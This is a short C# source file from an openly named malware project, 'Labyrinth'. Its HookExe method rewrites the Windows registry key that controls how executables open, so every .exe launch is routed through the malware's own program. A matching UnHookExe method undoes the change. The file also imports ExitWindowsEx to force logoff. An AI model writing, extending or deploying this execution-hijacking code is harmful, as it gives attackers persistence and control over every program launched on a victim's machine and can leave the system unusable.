using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Labyrinth
{

    //just some method storage
    class Misc
    {
        const string hookString = "?exech_r";
        const string malName = "Labyrinth";

        //windows log off
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);
        public static void HookExe(string path)
        { 
            Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", path + " " + hookString + " \"%1\" %*"); //hook all exes to specified path
        }
        public static void UnHookExe()
        {
            Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", "" + "" + "" + "\"%1\" %*"); //unhook exes
        }

        public static string RString(int length)
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[length];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new string(stringChars);
        }
        public static void StandardException(Exception e)
        {
            MessageBox.Show("ERROR: " + e.Message + "\n\n" + e.StackTrace, malName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

    }
}
